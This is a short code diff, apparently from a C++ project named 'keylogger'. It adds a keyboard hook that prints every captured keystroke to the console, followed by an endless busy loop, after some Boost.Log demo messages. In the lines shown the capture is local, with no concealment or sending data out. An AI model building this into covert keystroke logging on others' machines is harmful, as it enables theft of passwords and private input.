@@ -7,7 +7,7 @@
 #include <boost/log/sources/severity_logger.hpp>
 #include <boost/log/sources/record_ostream.hpp>
 
-#include <keylogger/utils/utils.hpp>
+#include <keylogger/hooks/keyboard.hpp>
 
 namespace logging = boost::log;
 namespace src = boost::log::sources;
@@ -36,6 +36,13 @@ int main(int, char* []) {
     BOOST_LOG_SEV(lg, warning) << "A warning severity message";
     BOOST_LOG_SEV(lg, error) << "An error severity message";
     BOOST_LOG_SEV(lg, fatal) << "A fatal severity message";
+
+    KeyboardEvents keyboard;
+    keyboard.ConnectHandler([](Event& ev){
+       std::cout << static_cast<KeyboardEvent&>(ev).key << std::endl;
+    });
+
+    while(true){}
 
     return 0;
 }
